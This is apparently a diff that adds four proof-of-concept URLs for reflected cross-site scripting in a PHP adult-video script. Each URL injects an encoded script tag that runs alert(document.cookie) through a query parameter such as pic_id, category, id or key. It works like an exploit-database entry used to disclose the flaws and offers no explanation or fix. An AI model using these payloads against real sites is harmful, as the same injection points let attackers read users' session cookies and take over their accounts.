@@ -1,0 +1,4 @@
+http://www.example.com/adult/includes/video_ad.php?pic_id=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
+http://www.example.com/adult/linkvideos_listing.php?category=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
+http://www.example.com/adult/templates/header1.php?id=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
+http://www.example.com/adult/video_listing.php?category=42&amp;amp;sort=2&amp;amp;key=&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
